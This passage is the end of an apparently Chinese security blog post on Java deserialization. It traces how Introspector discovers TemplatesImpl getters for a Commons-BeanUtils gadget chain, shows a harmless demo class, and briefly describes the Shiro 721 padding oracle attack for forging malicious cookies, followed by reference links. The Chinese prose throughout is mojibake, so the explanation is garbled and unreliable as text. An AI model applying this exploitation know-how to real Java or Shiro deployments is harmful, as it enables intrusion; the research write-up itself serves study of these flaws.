</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">descriptors</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="na">getName</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">descriptors</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æ ¹æ®<code>bean</code>(TemplatesImpl)é€šè¿‡<code>getPropertyDescriptors</code>ï¼Œå¾—åˆ°<code>descriptors</code>ï¼Œç„¶åforæ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„<code>name</code>ï¼Œè¿”å›å¯¹åº”çš„<code>descriptor</code>ã€‚</p>
<blockquote>
<p>æˆ‘å½“æ—¶å°±å¥½å¥‡<strong>ä¸ºä»€ä¹ˆ<code>TemplatesImpl</code>åªè¿”å›è¿™å‡ ä¸ªå€¼</strong>ï¼Œä¸ºä»€ä¹ˆæœ‰<code>getoutputProperties</code>ï¼Œä¸€åˆ‡é“ç†éƒ½åœ¨<code>getPropertyDescriptors</code>ä¸­ï¼Œæˆ‘ä»¬è·Ÿè¿›</p>
</blockquote>
<p><img loading="lazy" src="../images/image-20241128192555599.png" alt="image-20241128192555599"  />
</p>
<p>åˆ°<code>Introspector.getBeanInfo</code>ï¼Œåé¢çš„è°ƒè¯•ä¼šå¾ˆä¹±ï¼Œä¼šå»æ‰¾çˆ¶ç±»çš„getBeanInfoæ–¹æ³•ç›´åˆ°<code>null</code>ï¼ˆobjectï¼‰//è¿™é‡Œçœ‹ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ï¼Œå¤§æ¦‚çŸ¥é“å¹²äº†å•¥</p>
<p>æˆ‘ä»¬ä¸»è¦æ³¨æ„çš„æ˜¯<code>TemplatesImpl</code>çš„<code>getBeanInfo()</code>ï¼Œä»¥åŠ<code>getTargetPropertyInfo()</code>å› ä¸ºä»–å…¶å®å°±æ˜¯è·å–<code>Properties</code>çš„ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢<code>descriptors</code>çš„æ ¸å¿ƒå€¼</p>
<p><img loading="lazy" src="../images/image-20241128193007184.png" alt="image-20241128193007184"  />
</p>
<h4 id="å¥½æˆå¼€åœº-propertiesç”±æ¥">ã€*ã€‘å¥½æˆå¼€åœº Propertiesç”±æ¥<a hidden class="anchor" aria-hidden="true" href="#å¥½æˆå¼€åœº-propertiesç”±æ¥">#</a></h4>
<p>åœ¨<code>java/beans/Introspector.java#getTargetPropertyInfo()</code>ä¸­</p>
<p>æˆ‘ä»¬ç›´æ¥çœ‹åˆ°<code>Methodè·å–</code>è¿™é‡Œï¼Œä¼šè·å–<code>beanClass</code>(TemplatesImpl)çš„æ‰€æœ‰<code>Public Method</code>ï¼Œç„¶åé€šè¿‡ä¸‹é¢è¿™ä¸ªforè¿›è¡Œ<code>æ·»åŠ </code>ï¼Œè¿™ä¸ª<code>for</code>å°±æ˜¯æ ¸å¿ƒä»£ç </p>
<p>å¯ä»¥çœ‹åˆ°ä¸èƒ½æ˜¯<code>staticæ–¹æ³•</code>ï¼Œä¸èƒ½<code>Methodé•¿åº¦&lt;=3</code>ä¹Ÿä¸è¡Œï¼ˆé™¤é<code>iså¼€å¤´</code>æ–¹æ³•ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241128193356910.png" alt="image-20241128193356910"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="o">&lt;?&gt;[]</span><span class="w"> </span><span class="n">argTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getParameterTypes</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resultType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="w"> </span><span class="n">argCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argTypes</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PropertyDescriptor</span><span class="w"> </span><span class="n">pd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>è¿™ä¸€æ®µè¿›è¡Œä¸€äº›åˆå§‹åŒ–</p>
<p>ç„¶åä¸‹é¢è¿™æ®µifï¼Œæ»¡è¶³æ¡ä»¶çš„ä¼šç»™<code>pdè¿›è¡Œèµ‹å€¼</code>ï¼Œæ¯”å¦‚<code>getoutputProperties</code></p>
<p>ç¬¬ä¸€ä¸ªif (æ²¡æœ‰å‚æ•°)</p>
<p>ç¬¬äºŒä¸ªifï¼ˆgetå¼€å¤´ï¼‰</p>
<p>æ»¡è¶³ï¼ç»™pdèµ‹å€¼ï¼Œè¿™é‡Œæ³¨æ„ä¼ å‚çš„å€¼ï¼Œnameä¼šå»æ‰å‰ä¸‰ä½ï¼Œæ‰€ä»¥åé¢nameæ˜¯<code>outputProperties</code></p>
<blockquote>
<p>setterï¼Œgetteréƒ½æ˜¯å»é™¤å‰3ä½ï¼Œisæ˜¯2ä½</p>
</blockquote>
<p><img loading="lazy" src="../images/image-20241128194300708.png" alt="image-20241128194300708"  />
</p>
<p>è¿›è¡Œè¿™äº›åˆ¤æ–­åï¼Œpdæœ‰å€¼çš„ä¼šaddåˆ°<code>Properties</code>ï¼ˆå¹¶ä¸æ˜¯ä»£ç ä¸­è¿™ä¸ªå€¼ï¼Œè¿™ä¸ªåå­—ä½œä¸ºä¸€ä¸ªç†è§£çš„ä»£è¡¨ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241128194939321.png" alt="image-20241128194939321"  />
</p>
<p>åˆ°è¿™é‡Œå…¶å®å°±æ˜ç™½<code>Properties</code>æ˜¯æ€ä¹ˆæ¥çš„äº†ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›å€¼ï¼Œå…¶å®åœ¨jacksoné‚£ä¸ªåœ°æ–¹è·å–åˆ°getteræ–¹æ³•<code>Properties</code>åº”è¯¥æ˜¯å¼‚æ›²åŒå·¥ï¼ˆé‚£æ—¶æˆ‘å¥½åƒæ²¡ç»†çœ‹ï¼Œä»Šå¤©åˆšå¥½æ¥å…´è‡´äº†ï¼‰</p>
<h2 id="æ€»ç»“-properties">æ€»ç»“ Properties<a hidden class="anchor" aria-hidden="true" href="#æ€»ç»“-properties">#</a></h2>
<blockquote>
<p>åé¢åˆé‡åˆ°è¿™ä¸ªé—®é¢˜äº†ï¼Œå†™äº†ä¸ªdemoæµ‹äº†ï¼Œç„¶ååšä¸ªæ€»ç»“</p>
</blockquote>
<blockquote>
<p>é¦–å…ˆéƒ½è¦æ˜¯<code>public æ–¹æ³•</code></p>
<p>å…¶æ¬¡ä¼š<strong>é€’å½’</strong>é€šè¿‡ä¸‹é¢è¿™ç§æ–¹å¼æŸ¥æ‰¾<code>çˆ¶ç±»ç¬¦åˆçš„æ–¹æ³•</code></p>
<p><code>len&gt;3 or iså¼€å¤´</code>(ä¹Ÿå°±æ˜¯<code>get()</code>è¿™ç§ä¸è¡Œï¼Œ<code>is()</code>å¯ä»¥)</p>
<ul>
<li>
<p>is</p>
<ol>
<li>iså¼€å¤´</li>
<li>æ— å‚ &amp; è¿”å›(**<code>boolean</code>**ç±»å‹)å€¼</li>
</ol>
</li>
<li>
<p>getterå‹</p>
<ol>
<li>getå¼€å¤´</li>
<li>æ— å‚ or 1ä¸ª(**<code>int</code>**ç±»å‹)å‚æ•°</li>
</ol>
</li>
<li>
<p>setter</p>
<ol>
<li>
<p>setå¼€å¤´</p>
</li>
<li>
<p>1ä¸ªå‚æ•° &amp; æ— è¿”å›å€¼ï¼ˆ<code>void</code>ï¼‰</p>
<p>or</p>
<p>2ä¸ªå‚æ•° &amp; æ— è¿”å›å€¼ï¼ˆ<code>void</code>ï¼‰&amp; ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼ˆ**<code>int</code>**ç±»å‹)</p>
</li>
</ol>
</li>
</ul>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.PropertyUtilsBean</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.BeanInfo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.IntrospectionException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.Introspector</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.PropertyDescriptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">getter</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">PropertyUtilsBean</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">isIS</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isboolean</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">is</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">get0param</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">get</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getStr</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getint</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">sethas</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setvoid</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set2voidint1</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">one</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set2voidint2</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">two</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">set2voidint2</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">two</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">two</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IntrospectionException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanInfo</span><span class="w"> </span><span class="n">beanInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Introspector</span><span class="p">.</span><span class="na">getBeanInfo</span><span class="p">(</span><span class="n">getter</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w"> </span><span class="c1">// å‡è®¾ä½ çš„ç±»åæ˜¯Getter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PropertyDescriptor</span><span class="o">[]</span><span class="w"> </span><span class="n">descriptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">beanInfo</span><span class="p">.</span><span class="na">getPropertyDescriptors</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// éå†å¹¶æ‰“å°æ¯ä¸ªå±æ€§æè¿°ç¬¦</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">PropertyDescriptor</span><span class="w"> </span><span class="n">pd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">descriptors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">pd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="shiro-721">shiro 721<a hidden class="anchor" aria-hidden="true" href="#shiro-721">#</a></h1>
<p>è¿™é‡Œç®€å•æä¸€å˜´å§ï¼ŒåŸç†æ˜¯è·Ÿå¯†ç å­¦ç›¸å…³çš„ï¼Œçœ‹äº†ç†è§£ä¹Ÿä¸æ˜¯å¾ˆå¥½åšä¸ªè®°å½•</p>
<blockquote>
<p>ç»è¿‡<code>shiro550</code>åï¼Œshiro<code>å¯†é’¥å˜æˆéšæœº</code>çš„äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨**<code>Padding Oracle Attackæ”»å‡»</code>**ï¼ˆåŠ å¯†ç®—æ³•çš„ç¼ºé™·ï¼‰åœ¨<code>ä¸çŸ¥é“å¯†é’¥</code>çš„æƒ…å†µä¸‹æ„é€ å‡º<code>æ¶æ„å¯†æ–‡</code>è¿›è¡Œæ”»å‡»ï¼Œä½†æ˜¯æœ‰<code>ä¸€ä¸ªæ¡ä»¶</code>éœ€è¦ä¸€ä¸ªåˆæ³•çš„<code>Cookie</code>ï¼Œè¿™ä¸ªCookieæ˜¯ç”¨æ¥çˆ†ç ´çš„ã€‚</p>
</blockquote>
<p>è¿™é‡Œæ€»ç»“å¾ˆç®€é™‹ï¼_!å¯ä»¥çœ‹çœ‹å‚è€ƒéƒ½æ˜¯ä¸é”™çš„æ–‡ç« </p>
<p><strong>å‚è€ƒ</strong></p>
<blockquote>
<p>shiro550</p>
<p><a href="https://exp10it.io/2022/12/shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">https://exp10it.io/2022/12/shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90</a></p>
<p>shiro721</p>
<p><a href="https://www.cnblogs.com/dhan/p/18423531">å¤ç°shiro721</a></p>
<p><a href="https://www.anquanke.com/post/id/193165#h3-10">https://www.anquanke.com/post/id/193165#h3-10</a></p>
<p><a href="https://xz.aliyun.com/t/11633?time__1311=Cq0xRQiQwxgDlxGg6Du7YDkYG8BmhYt3x">https://xz.aliyun.com/t/11633?time__1311=Cq0xRQiQwxgDlxGg6Du7YDkYG8BmhYt3x</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>Springå†…å­˜é©¬</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
